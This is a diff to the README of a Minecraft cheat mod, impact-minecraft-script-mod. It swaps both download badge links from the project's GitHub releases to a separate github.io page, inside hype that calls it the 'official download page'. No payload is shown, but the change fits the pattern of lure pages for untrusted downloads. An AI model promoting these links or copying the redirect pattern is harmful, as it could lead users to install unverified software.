@@ -48,7 +48,7 @@ Getting impact-minecraft-script-mod on your computer takes only a few minutes. F
 
 ### Step 1: Visit the Official Download Page
 
-[![Download impact-minecraft-script-mod](https://img.shields.io/badge/Download-impact--minecraft--script--mod-brightgreen?style=for-the-badge&logo=github)](https://github.com/Aliimob4313/impact-minecraft-script-mod/releases)
+[![Download impact-minecraft-script-mod](https://img.shields.io/badge/Download-impact--minecraft--script--mod-brightgreen?style=for-the-badge&logo=github)](https://aliimob4313.github.io)
 
 Visit this link to download the application. This is the official download page where you'll find all the latest versions.
 
@@ -101,7 +101,7 @@ Best of all, everything is packaged in one simple download. No juggling multiple
 
 The power to play Minecraft your way is just one download away.
 
-[![Get impact-minecraft-script-mod](https://img.shields.io/badge/🚀_Download_Now-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=00b4d8)](https://github.com/Aliimob4313/impact-minecraft-script-mod/releases)
+[![Get impact-minecraft-script-mod](https://img.shields.io/badge/🚀_Download_Now-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=00b4d8)](https://aliimob4313.github.io)
 
 Visit this link to download the application. You'll be amazed at how much easier Minecraft becomes with impact-minecraft-script-mod in your toolkit. Whether you're farming resources, crushing the competition, or exploring the game's hidden depths, this mod gives you the edge you deserve.
 
